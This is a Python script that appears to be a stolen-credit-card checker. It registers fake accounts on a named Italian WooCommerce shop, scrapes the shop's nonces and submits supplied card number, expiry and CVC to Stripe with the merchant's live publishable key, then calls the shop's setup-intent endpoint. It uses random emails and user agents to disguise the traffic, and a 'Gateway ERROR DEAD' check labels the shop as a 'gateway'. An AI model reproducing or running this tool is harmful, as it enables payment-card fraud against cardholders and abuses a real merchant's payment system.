import requests
import re
import random
import string
from datetime import datetime
import user_agent
import sys

# Expiration Check

def Tele(ccx):
        import requests
        ccx=ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        if "20" in yy:#Mo3gza
                yy = yy.split("20")[1]
        r = requests.session()
        user = user_agent.generate_user_agent()
        def generate_random_account():
                name = ''.join(random.choices(string.ascii_lowercase, k=20))
                number = ''.join(random.choices(string.digits, k=4))

                return f"{name}{number}@yahoo.com"
        acc = (generate_random_account())


        def username():
                name = ''.join(random.choices(string.ascii_lowercase, k=20))
                number = ''.join(random.choices(string.digits, k=20))

                return f"{name}{number}"
        username = (username())

        def generate_random_code(length=32):
                letters_and_digits = string.ascii_letters + string.digits
                return ''.join(random.choice(letters_and_digits) for _ in range(length))

        corr = generate_random_code()

        sess = generate_random_code()

        headers = {
            'user-agent': user,
        }

        response = r.get('https://purpleprofessionalitalia.it/my-account/', cookies=r.cookies, headers=headers)

        register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)

        headers = {
            'user-agent': user,
        }

        data = {
            'email': acc,
            'password': 'ASDzxc#123#',
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_session_entry': 'https://purpleprofessionalitalia.it/my-account/',
            'wc_order_attribution_session_start_time': '2024-10-17 14:07:30',
            'wc_order_attribution_session_pages': '2',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': user,
            'mailchimp_woocommerce_newsletter': '1',
            'woocommerce-register-nonce': register,
            '_wp_http_referer': '/my-account/',
            'register': 'Registrati',
        }

        response = r.post('https://purpleprofessionalitalia.it/my-account/', cookies=r.cookies, headers=headers, data=data)


        headers = {
            'user-agent': user,
        }

        response = r.get('https://purpleprofessionalitalia.it/my-account/add-payment-method/', cookies=r.cookies, headers=headers)

        nonce=re.findall(r'"add_card_nonce":"(.*?)"',response.text)[0]


        headers = {
            'user-agent': user,
        }

        data = f'type=card&billing_details[name]=+&billing_details[email]=iegeodftomeppqjdgk%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NGkNqLqrv9VwaLxkKg6NxZWrX6UGN6mRkVNuvXXVzVepSrskeWwFwR3ExA8QOVeFCC1kBW5yQomPrJp44akaqxV00Dj7dk5cN'

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

        if not 'id' in response.json():
                print('ERORR CARD')
        else:
                id=response.json()['id']

        headers = {
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'wc-ajax': 'wc_stripe_create_setup_intent',
        }

        data = {
            'stripe_source_id': id,
            'nonce': nonce,
        }

        response = r.post('https://purpleprofessionalitalia.it/', params=params, cookies=r.cookies, headers=headers, data=data)
        return (response.json())
def check_expiration():
    expiration_date = datetime(2060, 11, 13, 11, 59)
    current_date = datetime.now()
    if current_date > expiration_date:
        sys.exit("Gateway ERROR DEAD")

# Run expiration check at the start
check_expiration()